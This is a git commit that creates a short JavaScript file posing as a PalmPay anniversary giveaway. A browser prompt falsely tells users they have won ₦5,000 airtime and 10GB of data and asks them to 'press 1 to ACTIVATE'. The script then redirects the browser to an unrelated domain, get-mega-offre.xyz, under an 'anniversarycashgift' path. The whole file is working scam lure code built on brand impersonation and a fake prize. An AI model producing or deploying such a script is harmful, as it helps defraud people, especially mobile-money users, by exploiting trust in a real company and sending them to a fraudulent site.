a1cd067086e1b1320ffd658bcd2cfe296d3283a1
bigetijazz9 <bigetijazz9@gmail.com>
2024-09-05 00:17:22 -0700

    Create palmpayat5.js

---
+++ palmpayat5.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Palmpay: Congratulations you are among the 10,000 Active Users to receive ₦5,000 Airtime and 10GB Free Data in celebration of our anniversary, Kindly press 1 to ACTIVATE ','1');
+if (password != '1') {
+location.href='https://www.get-mega-offre.xyz/anniversarycashgift';
+}
